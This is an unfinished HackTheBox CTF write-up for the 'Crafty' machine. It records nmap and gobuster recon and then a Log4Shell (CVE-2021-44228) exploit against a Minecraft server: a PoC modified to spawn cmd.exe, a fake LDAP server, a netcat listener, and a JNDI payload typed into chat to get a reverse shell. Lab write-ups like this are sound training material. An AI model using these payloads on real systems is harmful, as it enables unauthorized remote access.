---
aliases:
  - Crafty
Date: 2024-03-08
Platform: HackTheBox
Category: Machine
Difficulty: Easy
tags:
  - Windows
  - HackTheBox
  - "#Minecraft"
  - LDAP
Status: 
IP: 10.10.11.249
---

# Crafty

## Improved skills
- Remote Code Execution

## Used tools
- nmap
- gobuster

---

# Information Gathering

## Nmap

Scanned all TCP ports
Nothing interesting port **25565** and **Minecraft 1.16.5** version

```bash
┌──(kali㉿kali)-[~/Machine]
└─$ sudo nmap -sT -sV -p- crafty.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 15:52 EST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.036s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Gobuster

Scanned all possibility directory
Nothing of interesting i found for directory enumeration

```bash
┌──(kali㉿kali)-[~/Machine]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u crafty.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crafty.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 1826]
/img                  (Status: 301) [Size: 145] [--> http://crafty.htb/img/]
/Home                 (Status: 200) [Size: 1826]
/css                  (Status: 301) [Size: 145] [--> http://crafty.htb/css/]
/js                   (Status: 301) [Size: 144] [--> http://crafty.htb/js/]
/IMG                  (Status: 301) [Size: 145] [--> http://crafty.htb/IMG/]
/CSS                  (Status: 301) [Size: 145] [--> http://crafty.htb/CSS/]
/Img                  (Status: 301) [Size: 145] [--> http://crafty.htb/Img/]
/JS                   (Status: 301) [Size: 144] [--> http://crafty.htb/JS/]
/HOME                 (Status: 200) [Size: 1826]
/coming-soon          (Status: 200) [Size: 1206]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================

```

---

# Exploitation
## Apache Log4j Remote Code Execution Vulnerability - CVE-2021-44228

The Minecraft 1.16.5 version have the Log4j dll vulnerable to this [CVE](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-44228).
I found the exploit in this [github repository](https://github.com/kozmer/log4j-shell-poc) the proof of concept.
To exploit this vulnerability we need the [TLAUNCHER](https://tlauncher.org/jar) to play minecraft.

First step clone the repository and edit the poc.py file because the own machine is Windows and this python script it is thought, so edit the line 26 from **String cmd="/bin/bash";** to **String cmd="cmd.exe";**. 

![[Pasted image 20240310225653.png]]

Setup **PoC** and obtained an **LDAP URL**.  
![[Pasted image 20240310235407.png]]

```python
$ python3 poc.py --userip tun0 --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

Then setup the listener 
``` python
nc -lvnp 9001

```

Ok once setup the Poc and the listener can we start the **[TLAUNCHER](https://tlauncher.org/jar)** with the Fabric 1.16.5 version 
![[Pasted image 20240309144937.png]]

Now connect the multiplayer server (if don't see click add Server and put the IP:25565).
![[Pasted image 20240309145213.png]]

When the game started press *T* and type the **LDAP URL** in the chat and press enter.

``` text
${jndi:ldap://localhost:1389/a}
```

Now we have the reverse shell spawned in the listener, in the directory *C:\\Users\\svc_minecraft\\Desktop* is found the user flag.

//TODO PUT HERE THE FLAG

---

# Privilege Escalation


---

# Trophy & Loot
user.txt

root.txt